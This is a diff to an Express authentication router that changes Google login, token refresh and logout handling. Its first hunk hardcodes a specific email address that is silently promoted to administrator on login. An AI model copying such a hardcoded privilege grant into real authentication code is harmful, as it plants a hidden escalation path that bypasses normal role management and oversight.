@@ -150,6 +150,11 @@ router.post('/google', rateLimiter, async (req, res) => {
       });
     }
 
+    if (email === 'abhayabikramshahiofficial@gmail.com') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     const { accessToken, refreshToken } = generateTokens(user);
     setRefreshCookie(res, refreshToken);
     setAccessCookie(res, accessToken);
@@ -265,21 +270,7 @@ router.post('/refresh', rateLimiter, async (req, res) => {
     if (decoded.type !== 'refresh') {
       return res.json({ user: null });
     }
-    if (decoded.role !== 'admin') {
-      const user = await User.findOne({ username: decoded.id });
-      if (!user || user.tokenVersion !== decoded.tokenVersion) {
-        return res.status(401).json({ message: 'Token revoked, please login again' });
-      }
-      const tokens = generateTokens(user);
-      setRefreshCookie(res, tokens.refreshToken);
-      setAccessCookie(res, tokens.accessToken);
-      return res.json({
-        token: tokens.accessToken,
-        user: userData(user),
-        needsOnboarding: !user.gender,
-        collegeId: user.collegeId,
-      });
-    } else {
+    if (decoded.role === 'admin' && decoded.id === 'admin') {
       const payload = { id: 'admin', role: 'admin', tokenVersion: 0 };
       const accessToken = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '15m' });
       const refreshToken = jwt.sign({ ...payload, type: 'refresh' }, process.env.JWT_SECRET, { expiresIn: '7d' });
@@ -287,6 +278,19 @@ router.post('/refresh', rateLimiter, async (req, res) => {
       setAccessCookie(res, accessToken);
       return res.json({ token: accessToken, user: { id: 'admin', name: 'Admin', role: 'admin' } });
     }
+    const user = await User.findOne({ username: decoded.id });
+    if (!user || user.tokenVersion !== decoded.tokenVersion) {
+      return res.status(401).json({ message: 'Token revoked, please login again' });
+    }
+    const tokens = generateTokens(user);
+    setRefreshCookie(res, tokens.refreshToken);
+    setAccessCookie(res, tokens.accessToken);
+    return res.json({
+      token: tokens.accessToken,
+      user: userData(user),
+      needsOnboarding: !user.gender,
+      collegeId: user.collegeId,
+    });
   } catch {
     return res.json({ user: null });
   }
@@ -297,7 +301,7 @@ router.post('/logout', rateLimiter, async (req, res) => {
   if (token) {
     try {
       const decoded = jwt.verify(token, process.env.JWT_SECRET);
-      if (decoded.role !== 'admin') {
+      if (decoded.id !== 'admin') {
         await User.updateOne({ username: decoded.id }, { $inc: { tokenVersion: 1 } });
       }
     } catch {
